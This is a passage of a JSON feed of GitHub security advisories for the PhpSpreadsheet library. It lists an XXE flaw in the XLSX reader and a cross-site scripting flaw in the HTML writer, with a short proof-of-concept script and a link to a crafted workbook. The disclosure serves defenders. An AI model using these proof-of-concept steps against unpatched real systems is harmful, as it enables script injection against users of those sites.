href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf\">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45293\">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88",
            "title": "[phpoffice/phpexcel] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2025-03-06T18:14:42.000Z",
            "date_published": "2024-10-07T15:58:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>\\PhpOffice\\PhpSpreadsheet\\Writer\\Html</code> does not sanitize \"javascript:\" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Example target script:</p>\n<pre><code>&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>Save this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx\">book.xlsx</a></p>\n<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45292\">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks",
            "date_modified": "2025-03-06T18:14:07.000Z",
            "date_published": "2024-10-07T15:58:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}